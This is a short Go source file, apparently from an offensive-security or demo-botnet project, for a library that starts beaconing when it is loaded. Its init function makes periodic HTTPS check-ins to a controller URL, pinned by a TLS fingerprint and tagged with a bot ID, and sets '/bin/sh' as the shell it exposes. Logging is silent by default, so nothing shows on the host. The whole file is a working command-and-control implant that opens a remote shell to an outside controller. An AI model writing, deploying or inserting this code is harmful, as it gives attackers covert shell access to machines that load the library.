// Library anime_costume_cheese - HTTPS beacons in a loop without curl
package main

/*
 * anime_costume_cheese.go
 * HTTPS beacons in a loop without curl
 * By J. Stuart McMurray
 * Created 20251116
 * Last Modified 20251118
 */

import (
	"context"
	"log/slog"
	"os"

	"github.com/magisterquis/anime_costume_cheese/pkg/beaconer"
)

var (
	Fingerprint string  /* TLS Fingerprint. */
	ID          string  /* Bot ID, optional. */
	URL         string  /* Demobotnet controller URL, less ID. */
	Interval    = "15s" /* Beacon interval. */
	LogLevel    string  /* Empty, DEBUG, anything else is INFO. */
)

// logOutput is where we send our logs.
var logOutput = os.Stderr

func init() {
	sl := logger()
	sl.Debug("Library loaded")
	if err := (&beaconer.Beaconer{
		SL:          sl,
		Fingerprint: Fingerprint,
		ID:          ID,
		URL:         URL,
		Interval:    Interval,
		ShellArgv:   []string{"/bin/sh"},
	}).Beacon(context.Background()); nil != err {
		sl.Error("Unrecoverable error", "error", err)
	}
}

// logger works out how we'll log.
func logger() *slog.Logger {
	// No logger is easy.
	if "" == LogLevel {
		return beaconer.DiscardLogger
	}
	/* Work out logging. */
	lv := slog.LevelInfo
	if slog.LevelDebug.String() == LogLevel {
		lv = slog.LevelDebug
	}
	return slog.New(slog.NewJSONHandler(logOutput, &slog.HandlerOptions{
		Level: lv,
	}))
}

func main() {}
